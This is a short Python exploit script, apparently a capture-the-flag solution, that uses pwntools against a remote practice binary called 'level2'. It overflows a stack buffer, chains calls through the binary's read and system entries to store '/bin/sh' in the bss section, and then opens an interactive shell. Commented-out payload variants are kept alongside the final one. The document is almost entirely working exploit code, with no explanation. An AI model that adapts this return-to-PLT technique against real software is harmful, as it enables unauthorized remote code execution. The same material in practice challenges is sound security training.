from pwn import *

#context.log_level = 'debug'
elf = ELF('level2')
r = remote('pwn2.jarvisoj.com',9878)

plt_read = elf.plt['read']
plt_system = elf.plt['system']
main_addr = 0x0804844B

bss_addr = 0x0804a030 - 10 

#bin_addr = next(elf.search('/bin/sh'))
#payload = 'a' * 0x88 + 'a' *4 + p32(plt_read) + p32(plt_system) + p32(0) + p32(bss_addr) + p32(8) + p32(bss_addr)

payload = 'a' * 0x88 + 'a' * 4 + p32(plt_read) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)

#payload = 'a' * 0x88 + 'a' * 4 + p32(plt_system) + p32(1) + p32(bin_addr)
r.sendline(payload)
r.sendline('/bin/sh')

#sleep(2)
r.recvuntil('Input:')

payload2 = 'a' * 0x88 + 'a' * 4 + p32(plt_system) + p32(1) + p32(bss_addr)

r.sendline(payload2)

r.interactive()
